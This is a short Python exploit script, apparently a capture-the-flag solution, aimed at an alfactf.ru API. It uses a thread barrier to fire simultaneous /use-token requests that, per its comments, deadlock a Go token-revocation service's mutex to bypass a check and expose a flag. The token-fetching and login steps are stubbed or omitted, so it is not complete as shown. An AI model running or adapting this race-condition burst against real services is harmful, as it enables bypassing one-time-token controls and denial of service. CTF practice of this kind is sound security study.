import threading
import requests
import time

# Note: This exploit triggers a mutex deadlock in the Go revocation service.
# It requires about 50-100 parallel requests to ensure the 50ms timeout is exceeded.

BASE_URL = "https://basecamp-srv.alfactf.ru/api"

def exploit():
    # 1. Setup session and tokens
    session = requests.Session()
    # (Registration/Login logic omitted for brevity)
    
    # 2. Get many one-time tokens
    # tokens = [session.post(f"{BASE_URL}/request-access").json()['token'] for _ in range(60)]
    tokens = ["token_1", "token_2", "etc"] # Mock
    
    # 3. Burst requests
    barrier = threading.Barrier(len(tokens))
    threads = []
    
    def worker(t):
        barrier.wait()
        requests.post(f"{BASE_URL}/use-token", json={"token": t})

    for t in tokens:
        thread = threading.Thread(target=worker, args=(t,))
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

    # 4. Check for flag
    # After the deadlock, the check might bypass or reveal the flag.
    print("[+] Exploit finished. Check /api/courses for the flag.")

if __name__ == "__main__":
    exploit()
